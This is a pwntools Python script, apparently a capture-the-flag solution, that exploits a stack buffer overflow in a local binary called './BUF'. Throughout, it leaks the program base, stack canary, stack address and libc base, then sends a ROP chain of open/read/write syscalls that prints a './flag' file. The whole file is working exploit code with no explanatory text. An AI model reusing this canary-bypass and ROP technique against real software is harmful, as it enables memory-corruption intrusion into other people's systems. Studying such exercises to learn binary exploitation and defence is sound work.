#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./BUF')
elf = ELF('./BUF')
libc = ELF('./libc-2.27.so')

def pr(a,addr):
	log.success(a+': '+hex(addr))

p.recvuntil("Enter your name: \n")
p.sendline('a'*7)
p.recvuntil("a"*7+'\x0a')
_start = u64(p.recvuntil("\n",drop=True) + p16(0))
codebase = _start - 0x780
vuln = codebase + 0xa4c
ret = codebase + 0x6fe
pr('_start',_start)
pr('codebase',codebase)
pr('vuln',vuln)

p.recvuntil("Enter your data:\n")
payload = 'a'*104
p.sendline(payload) # sendline() 会在 payload 后面追加一个换行符 '\n' 对应的十六进制就是 0xa

p.recvuntil("Your data: ")
p.recvuntil('a'*104)
canary = u64(p.recv(8).ljust(8, "\x00")) - 0xa
stack = u64(p.recv(6).ljust(8, "\x00"))
rbp = stack - 0x10
pr('canary',canary)
pr('rbp',rbp)

p.recvuntil("Enter your data:\n")
payload  = "A"*104 + p64(canary) + p64(rbp)
payload += p64(ret) + p64(vuln)
p.send(payload)
p.recvuntil("Your data: ")

#again
p.recvuntil("Enter your data:\n")
payload  = "A"*120 # 泄露libcbase
p.sendline(payload)

p.recvuntil("Your data: ")
p.recvuntil('A'*120)
libcbase = u64(p.recv(6).ljust(8, "\x00")) - 0xa - 0x21c00 #29d00
pr('libcbase',libcbase)

#gdb.attach(p)
#pause()

#==============================================================

syscall_ret = libcbase + 0xd2625 # syscall ; ret
bss_addr = libcbase + libc.bss()
prdx_ret = libcbase + 0x130514 # pop rdx ; pop r10 ; ret
prdi_ret = libcbase + 0x2164f  # pop rdi ; ret
prsi_ret = libcbase + 0x23a6a  # pop rsi ; ret
prax_ret = libcbase + 0x1b500  # pop rax ; ret

#==============================================================

p.recvuntil("Enter your data:\n")
payload  = "\x00"*104 + p64(canary)

# open
payload += b'./flag\x00\x00' # rbp
payload += p64(prdi_ret) + p64(rbp+0x10) #new rbp
payload += p64(prsi_ret) + p64(0)
payload += p64(prax_ret) + p64(2)
payload += p64(syscall_ret)

#read
payload += p64(prdi_ret) + p64(3)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret ) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(0)
payload += p64(syscall_ret)

#write
payload += p64(prdi_ret) + p64(1)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret ) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(1)
payload += p64(syscall_ret)

#==============================================================

p.send(payload)
p.interactive()
